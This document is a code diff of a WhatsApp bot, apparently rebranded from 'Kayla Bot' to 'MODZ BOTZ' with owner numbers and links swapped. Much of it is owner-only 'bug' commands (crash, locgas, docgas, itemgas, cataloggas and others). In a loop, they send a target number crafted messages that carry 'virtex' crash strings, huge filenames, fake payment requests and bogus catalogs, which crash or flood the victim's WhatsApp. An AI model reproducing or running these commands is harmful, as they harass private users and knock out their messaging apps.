-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 20K • Premium 1 Bulan
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 35K • Premium 1 Tahun
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 45K • Premium Permanent
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-}
-break
-case 'botkay':
-if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 10K • Jadibot 1 Minggu
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 20K • Jadibot 1 Bulan
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 35K • Jadibot 1 Tahun
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 45K • Jadibot Permanent
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-}
-break
-case 'ownkay':
-if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 10K • Jadi Owner 1 Minggu
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 20K • Jadi Owner 1 Bulan
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 35K • Jadi Owner 1 Tahun
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 45K • Jadi Owner Permanent
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-}
-break
 case 'addprem':
 if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await kayla.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -2084,7 +1980,7 @@ reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
 break
 case 'delprem':
 if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
@@ -2125,7 +2021,7 @@ reply(teks)
 break
 case 'addowner':
 if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await kayla.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -2135,7 +2031,7 @@ reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
 break
 case 'delowner':
 if (!itsMeKayla) return reply(mess.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
@@ -2197,7 +2093,6 @@ rowId: x.key
 }
 const listMessageNya = {
 text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
-footer: "List By Kayla",
 buttonText: "Click Here",
 sections: [{
 title: groupName, rows: arr_rows
@@ -2323,15 +2218,15 @@ case 'cekme':
 					bet = `${sender}`
 					var sifat = ['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
 					var hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
-					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget kek mimin😍','❌','✔️']
 					var wetak= ['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
-					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','10','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
 					var biho = hoby[Math.floor(Math.random() * hoby.length)]
 					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
@@ -2380,15 +2275,16 @@ contextInfo: {
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }}
 }, { quoted: m })
 fs.unlinkSync(ran)
 })
 }
 break
-case 'sticker': 
+case 'sticker':
+case 'stiker':
 case 's': {
 if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
@@ -2541,7 +2437,7 @@ case 'vote': {
 if (!itsMeKayla) return reply(mess.owner)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO SAYA KAYLA BOT",
+"name": "HALO SAYA MODZ BOTZ",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -2556,7 +2452,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI KAYLA BOT"
+"optionName": "SALAM DARI MODZ BOTZ"
 	}
 ],
 "selectableOptionsCount": 5
@@ -2579,7 +2475,7 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 break
 case 'crash':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
@@ -2611,7 +2507,7 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 break
 case 'jagoan' : {
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 kayla.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
 requestPaymentMessage: { 
 Message: { 
@@ -2623,10 +2519,10 @@ expiryTimestamp: 8000,
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `Kayla Bot ${virus}${virtex(prefix)}`,
-"body": `Kayla Bot ${virus}${virtex(prefix)}`,
+"title": `MODZ BOTZ ${virus}${virtex(prefix)}`,
+"body": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 mimetype: 'audio/mpeg', 
-caption: `Kayla Bot WhatsApp${ngazap(prefix)}`,
+caption: `MODZ BOTZ WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyauser, 
@@ -2642,17 +2538,17 @@ kayla.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.s
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `Kayla Bot ${virus}${virtex(prefix)}`, 
+text: `MODZ BOTZ ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `Kayla Bot`,
+"title": `MODZ BOTZ`,
 "body": `Masih Bawahan`,
 mimetype: 'audio/mpeg', 
-caption: `Kayla Bot WhatsApp${ngazap(prefix)}`,
+caption: `MODZ BOTZ WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyauser, 
@@ -2664,18 +2560,18 @@ await sleep(1000)
 break
 case 'locgas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `Kayla Bot ${virus}${virtex(prefix)}`,
+"name": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `Kayla Bot ${virus}${virtex(prefix)}`,
+"caption": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
@@ -2689,15 +2585,15 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'teksgas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.relayMessage(num, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `Kayla Bot ${virus}${virtex(prefix)}`, 
+text: `MODZ BOTZ ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2710,9 +2606,9 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'vngas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
@@ -2722,9 +2618,9 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'kongas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendContact(num, owner, lep)
 await sleep(1000)
@@ -2734,13 +2630,13 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'docgas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(num, { 
 document: ppnyauser, 
-fileName: `🔥 KAYLA BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
+fileName: `🔥 MODZ BOTZ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 fileLength: "999999999", 
@@ -2752,9 +2648,9 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'stickgas':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 kayla.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
 await sleep(1000)
@@ -2764,11 +2660,11 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'itemgas': {
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, `Kayla Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, `MODZ BOTZ ${virus}${virtex(prefix)}`, `MODZ BOTZ ${virus}${virtex(prefix)}`, `MODZ BOTZ ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
@@ -2776,9 +2672,9 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'cataloggas': {
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283845409710`)
 num = `${q}`+'@s.whatsapp.net'
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
@@ -2786,7 +2682,7 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "7091718154232528",
-"title": `Kayla Bot WhatsApp ${virus} ${virtex(prefix)}`,
+"title": `MODZ BOTZ WhatsApp ${virus} ${virtex(prefix)}`,
 "description": `${virus}${virtex(prefix)}`,
 "currencyCode": "IDR",
 "priceAmount1000": "100000000000000000",
@@ -2794,9 +2690,9 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6285807264974`
+"url": `https://wa.me/6283845409710`
 },
-"businessOwnerJid": "6285807264974@s.whatsapp.net",
+"businessOwnerJid": "6283845409710@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
 kayla.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -2807,7 +2703,7 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 break
 case 'kaylog':{
 if (!itsMeKayla) return reply(mess.owner)
-jumlah = '25'
+jumlah = '10'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kayla.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
